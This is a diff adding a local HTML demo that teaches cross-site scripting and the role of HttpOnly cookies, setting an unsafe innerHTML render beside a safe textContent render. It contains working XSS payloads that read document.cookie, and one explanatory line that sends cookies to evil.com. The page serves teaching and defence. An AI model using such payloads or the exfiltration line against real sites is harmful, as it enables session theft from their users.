@@ -1,0 +1,78 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>XSS in 2 minutes — why HttpOnly matters</title>
+<!--
+  A tiny, SAFE, self-contained demo of Cross-Site Scripting (XSS).
+  No server, no build, no network calls. Just: double-click this file to open it.
+
+  The whole idea of XSS in one line:
+    if a site renders USER TEXT as HTML, an attacker can smuggle in a <script>
+    that runs inside YOUR page, with YOUR cookies.
+
+  Everything here is local and harmless (it only pops alert() boxes). It exists to
+  show the shape of the bug and the fix — never point a real payload at a site you
+  don't own.
+-->
+<style>
+  body { font-family: system-ui, sans-serif; max-width: 760px; margin: 30px auto; line-height: 1.6; color: #1e293b; padding: 0 16px; }
+  h1 { color: #6d28d9; } h2 { margin-top: 30px; border-bottom: 2px solid #a855f7; padding-bottom: 4px; color: #6d28d9; font-size: 1.15rem; }
+  textarea { width: 100%; height: 60px; font-family: ui-monospace, Menlo, monospace; font-size: 0.9rem; padding: 8px; box-sizing: border-box; border: 1px solid #cbd5e1; border-radius: 8px; }
+  button { padding: 8px 14px; margin: 8px 6px 8px 0; cursor: pointer; border-radius: 8px; border: 1px solid #a855f7; background: #f5f3ff; font-weight: 600; }
+  .render { border: 1px solid #cbd5e1; border-radius: 8px; padding: 12px; margin: 10px 0; min-height: 28px; }
+  .bad { border-color: #ef4444; background: #fef2f2; } .good { border-color: #10b981; background: #f0fdf4; }
+  code { background: #f1f5f9; padding: 1px 5px; border-radius: 4px; font-size: 0.88rem; }
+  pre { background: #0f172a; color: #e2e8f0; padding: 12px; border-radius: 8px; overflow-x: auto; font-size: 0.85rem; }
+  .tag { font-size: 0.72rem; font-weight: 800; letter-spacing: .05em; text-transform: uppercase; }
+  .muted { color: #64748b; font-size: 0.9rem; }
+</style>
+
+<h1>🐛 XSS in 2 minutes</h1>
+<p>Pretend this page is a <strong>comments section</strong>. You (the "attacker") type a comment; the site displays it. The only difference between the two boxes below is <em>how</em> the site renders your text.</p>
+
+<h2>The payload — paste one of these as your "comment"</h2>
+<p class="muted">These only pop a local <code>alert()</code> showing this page's <code>document.cookie</code> — harmless, but it proves a script <em>ran</em> and could read your cookies.</p>
+<pre>&lt;img src=x onerror="alert('XSS! I can read: ' + document.cookie)"&gt;
+
+&lt;script&gt;alert('XSS! cookie = ' + document.cookie)&lt;/script&gt;   &lt;!-- (innerHTML won't run bare &lt;script&gt;; the img trick does) --&gt;</pre>
+<textarea id="input">&lt;img src=x onerror="alert('XSS! I can read: ' + document.cookie)"&gt;</textarea>
+<div>
+  <button onclick="renderUnsafe()">😱 Render the UNSAFE way (innerHTML)</button>
+  <button onclick="renderSafe()">✅ Render the SAFE way (textContent)</button>
+  <button onclick="toggleHttpOnly()">Toggle a fake "session cookie"</button>
+</div>
+
+<h2><span class="tag" style="color:#ef4444">Vulnerable</span> — the site drops your text straight into the page as HTML</h2>
+<div class="render bad" id="unsafe">— click "Render the UNSAFE way" —</div>
+<p class="muted">Code the site ran: <code>el.innerHTML = userComment</code>. Your <code>&lt;img onerror&gt;</code> executed. On a real site, instead of <code>alert()</code> the payload would do <code>fetch('https://evil.com/steal?c=' + document.cookie)</code> and every visitor's session id would land in the attacker's logs.</p>
+
+<h2><span class="tag" style="color:#10b981">Safe</span> — the site treats your text as text</h2>
+<div class="render good" id="safe">— click "Render the SAFE way" —</div>
+<p class="muted">Code the site ran: <code>el.textContent = userComment</code>. The exact same payload shows up as literal characters and does nothing. (React/Django/Jinja escape by default — this is why.)</p>
+
+<h2>🔑 Where HttpOnly comes in</h2>
+<p id="cookieState" class="muted"></p>
+<p>Click "Toggle a fake session cookie", then run the UNSAFE render again:</p>
+<ul>
+  <li><strong>Without <code>HttpOnly</code></strong> (a normal <code>document.cookie</code> value): the payload's <code>document.cookie</code> <em>includes</em> the session id → the XSS steals it.</li>
+  <li><strong>With <code>HttpOnly</code></strong>: the browser hides that cookie from JavaScript, so <code>document.cookie</code> comes back <em>without</em> it → the same XSS gets nothing useful. (You can't set a real HttpOnly cookie from JS — that's the whole point — so this demo just simulates the two outcomes in the note below.)</li>
+</ul>
+<p class="muted"><strong>Two lessons:</strong> (1) the real fix is to <em>never render user input as HTML</em> — escape it (the SAFE box). (2) <code>HttpOnly</code> is defence-in-depth: even if an XSS slips through, it can't read the session cookie.</p>
+
+<script>
+  // a fake, readable "session" cookie so the demo has something to steal
+  document.cookie = "sid=abc123; SameSite=Lax; Max-Age=600";
+  function showState() {
+    document.getElementById("cookieState").innerHTML =
+      "JS can currently read: <code>document.cookie = \"" + (document.cookie || "(nothing)") + "\"</code>";
+  }
+  function renderUnsafe() { document.getElementById("unsafe").innerHTML = document.getElementById("input").value; }
+  function renderSafe()   { document.getElementById("safe").textContent  = document.getElementById("input").value; }
+  let hidden = false;
+  function toggleHttpOnly() {
+    hidden = !hidden;
+    if (hidden) { document.cookie = "sid=; Max-Age=0"; document.getElementById("cookieState").innerHTML =
+      "Simulating <code>HttpOnly</code>: the sid is now hidden from JS. Run the UNSAFE render — the alert shows <strong>no sid</strong>. The cookie still rides on real requests; JS just can't see it."; }
+    else { document.cookie = "sid=abc123; SameSite=Lax; Max-Age=600"; showState(); }
+  }
+  showState();
+</script>
